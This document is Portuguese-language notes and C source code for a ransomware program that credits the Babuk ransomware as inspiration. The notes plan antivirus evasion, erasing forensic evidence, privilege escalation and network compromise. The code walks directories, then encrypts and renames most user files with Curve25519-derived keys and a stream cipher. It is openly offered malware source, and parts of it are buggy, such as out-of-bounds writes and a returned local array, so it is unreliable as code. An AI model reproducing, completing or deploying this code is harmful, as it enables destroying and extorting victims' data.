Ransomware:
O que é?  Malware que sequestra os seus arquivos
Tipos de Criptografia  

Simetrica: Uma chave e uma operacçao de cifra f(k,cipher)=out
Assimetrica:Uma Chave Publica -> e uma privada  para descriptografia

Curvas elipticas: Usa  a algebra das curvas elpitcas
Pegamos um corpo Fp sendo P primo e elucidamos ECDLP
sejaum corpo P  sobre uma curva elpitica e um ponto P

encontre k tal P=k*G
Inviavel  computacionalmentel
Ransomware:

Recursos:Enuemrar arquivos dado um caminho
enumera Pastas
Enumerar compartilhamentos de rede
enuemrar volumes

Evadir antivirus
apagar evidencias forenses
escalar privelegios
definir alvo:
Usuario comun:
Redes:Pesquisar e usar egenharia ou exploits para compromenter a rede
e  necessarioum reconhecimento inicial




Listar arquivos:

VOID ListDirFile(char *path){
char sc[MAX_PATH],buf[MAX_PATH];
	 WIN32_FIND_DATA in;
	 HANDLE fd,file;
	 char *fm = "%s\\%s",*fm1 = "%s\\*.*";

	 if(strlen(path) == 3)
	 {
		path[2] = '\0'; /* :-) */
	 }

	 sprintf(sc,fm1,path);
     fd = FindFirstFile(sc,&in);

 do
 {

	 sprintf(buf,fm,path,in.cFileName);

	   /* dot :) */
	 if(strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0 && (in.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
	 {
		 ListDirFile(buf);
	 }

	   /* File found */
	 else
	 {

		 /* is it good to encrypt ? */

		 if(  !strstr(in.cFileName,".LockerKey")  &&  !strstr(in.cFileName,".dll")
			 && !strstr(in.cFileName,".exe") && !strstr(in.cFileName,".ini") &&
			     !strstr(in.cFileName,".vxd") && !strstr(in.cFileName,".drv") &&
				 strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0)
		 {
			 Encrypt_File(buf);
		 }
	 }

 }while(FindNextFile(fd,&in));

 FindClose(fd);
}->funçao recursiva se   o caminho nao for uum caminho completo de arquivo continuar a pesquisa
codigo completo abaixo

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <dirent.h>
#include "curve25519-donna.h"
#include <bcrypt.h>
#include <ntsecapi.h>
#include "sha512.h"
#include <locale.h>
#include "ecrypt-sync.h"
#include <bcrypt.h>
#include <Shlwapi.h>


char * extract_file_name(WCHAR path[1024])
{
    int len = strlen(path);
    int flag=0;
    printf("\nlength of %s : %d",path, len);


    for(int i=len-1; i>0; i--)
    {
        if(path[i]=='\\' || path[i]=='//' || path[i]=='/' )
        {
            flag=1;
            path = path+i+1;
            break;
        }
    }


    return path;
}
WCHAR* rename_extension( WCHAR name[MAX_PATH]){
name[MAX_PATH]='\0';
WCHAR newName[MAX_PATH];
newName[MAX_PATH]='\0';
char ext[10]="LockerKey";
strcpy( newName, name );
//PathRemoveExtensionA(name);
PathRemoveExtensionW(newName);
strcat(newName,ext);

return(newName);


}







//funçao de derivaçao de chave use na criptografia simetrica
int m_publ[32] = {
        8,  8,  6,  4,  4,  4,  4,  4,  5,  0,
        'n',  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00
};



void FwriteKey(char *path){}//iscrece a chave publica

const  char C[ 32 ] = { 9 };//Bse
 //nao use a mesma  chave para cada amostra e vitima//queremos ter  2^256 chaves possivesi
void cipherxor(BYTE *buffer,int len,BYTE *key){
int    j=0;

 for(int i = 0; i <= len; i++){

buffer[i]=buffer[i]^=key[i];

    }

//segredo compartilhado
}//usaremos o segredo co
BYTE* generatPrivateKey(BYTE *key){
    HCRYPTPROV  hCryptProv;
 memset (key, 0, 32);


 if( RtlGenRandom(key,32)==FALSE){
    printf("erro");
}


return(key);


}
void remove_extension(char* s) {
  char* dot = 0;
  while (*s) {
    if (*s == '.') dot = s;  // last dot
    else if (*s == '/' || *s == '\\') dot = 0;  // ignore dots before path separators
    s++;
  }
  if (dot) *dot = '\0';
}

VOID Encrypt_File(char    *name){
//name[MAX_PATH]='\0';
char out[MAX_PATH];
out[MAX_PATH]='\0';
strcpy(out,name);

printf("%s",out);
char *ext=".LockerKey";

PathRemoveExtensionA(out);
printf("%s\n",out);
strcat(out,".exe");
printf("%s\n",out);
char outp[MAX_PATH];
outp[MAX_PATH]='\0';
strcpy(outp,out);
printf("%s",outp);
//strcat(inp,ext);
//printf("%s",inp);

rename(name,outp);
HCRYPTPROV  hCryptProv;
BYTE pbDataSecrete[ 32];
BYTE pbDataPublic[ 32];
BYTE pbShare[ 32];
BYTE pbShareDest[ 32];
generatPrivateKey(&pbDataSecrete);

pbDataSecrete[0] &= 248;
                    pbDataSecrete[31] &= 127;
                    pbDataSecrete[31] |= 64;
                    curve25519_donna(&pbDataPublic,   &pbDataSecrete[ 32], &C);
                    curve25519_donna(&pbShare,   &pbDataSecrete[ 32], &m_publ);
                   //SHA512Hash((uint8_t)&pbShare,32);
                   memset(&pbDataSecrete,0,32);//zeremos a chave privada
BYTE k[32];
BYTE *nonce="100116649696923968170152204148972049320091145701181271883417257213772402812516828";
sha512(pbShare,32,k);
  ECRYPT_ctx ctx;
   ECRYPT_init();       //zfaça o hash
ECRYPT_keysetup(&ctx, k, 256, 256);
 ECRYPT_ivsetup(&ctx, nonce);

FILE *fin = fopen(outp, "rb");//abrimos o arquivo
    fseek(fin, 0, SEEK_END);//
    long len = ftell(fin);
    rewind(fin);//reposiciona o ponteiro  para o iicio
    BYTE *buffer =(BYTE*) malloc(len);
    //aloca



    fread(buffer, len, 1, fin);//Ler o conteudo do arquivo
ECRYPT_encrypt_bytes(&ctx,buffer,buffer,len);
memset((BYTE*)&ctx,0,sizeof (ECRYPT_ctx));

memset(k,0,32);
memset(pbShare,0,32);
memset(pbDataSecrete,0,32);
//   cipherxor(buffer,len,shared_secrete);


//strcat(newName,ext);





     FILE *fout = fopen(outp, "wb");//Substituimos o arquivo e iscrevemos os dados criptogrados
    fwrite(buffer, len, 1, fout);
    //fprintf(fout,".f");
    fclose(fout);
free(buffer);

    /*CHAR newname[MAX_PATH];
	strcpy(newname,name);
	strcat(newname,".LockerKey");
	MoveFile(name,newname);*////Renomeamos e mudamos a extensao dos nosso arquivos






}
VOID ListDirFile(char *path){
char sc[MAX_PATH],buf[MAX_PATH];
	 WIN32_FIND_DATA in;
	 HANDLE fd,file;
	 char *fm = "%s\\%s",*fm1 = "%s\\*.*";

	 if(strlen(path) == 3)
	 {
		path[2] = '\0'; /* :-) */
	 }

	 sprintf(sc,fm1,path);
     fd = FindFirstFile(sc,&in);

 do
 {

	 sprintf(buf,fm,path,in.cFileName);

	   /* dot :) */
	 if(strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0 && (in.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
	 {
		 ListDirFile(buf);
	 }

	   /* File found */
	 else
	 {

		 /* is it good to encrypt ? */

		 if(  !strstr(in.cFileName,".LockerKey")  &&  !strstr(in.cFileName,".dll")
			 && !strstr(in.cFileName,".exe") && !strstr(in.cFileName,".ini") &&
			     !strstr(in.cFileName,".vxd") && !strstr(in.cFileName,".drv") &&
				 strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0)
		 {
			 Encrypt_File(buf);
		 }
	 }

 }while(FindNextFile(fd,&in));

 FindClose(fd);
}




VOID GetDrives(){





}//Vamos Obter as Unidades Logicas e Remotas e depois criptograflas

VOID Recursive_List_dir();






int main(){


 ListDirFile("C:\\Users\\estan\\Downloads\\Nova pasta (2)\\Telegram Desktop\\encodings");

  setlocale(LC_ALL, "Portuguese");

//ListDirFile(L"C:\\Users\\estan\\OneDrive\\Documentos\\Nova pasta (3)");

BYTE *nonce="100116649696923968170152204148972049320091145701181271883417257213772402812516828";




    int i=0;






return 0;}
//Autor Hackerxploitation  ispirado nobabuuk ransoware

